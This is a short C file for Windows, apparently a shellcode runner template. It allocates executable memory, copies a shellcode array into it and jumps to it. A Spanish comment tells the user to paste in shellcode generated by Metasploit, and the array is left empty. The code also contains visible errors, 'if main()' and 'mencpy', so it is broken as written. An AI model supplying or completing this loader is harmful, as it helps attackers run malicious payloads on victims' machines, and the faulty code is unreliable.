#include <stdio.h>
#include <string.h>
#include <windows.h>

unsigned char shellcode[] = ""; //Poner shelldcode generado por metasploit por ejemplo

if main(){
	void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	mencpy(exec, shellcode, sizeof(shellcode));
	((void(*)())exec)();
	return 0;
}
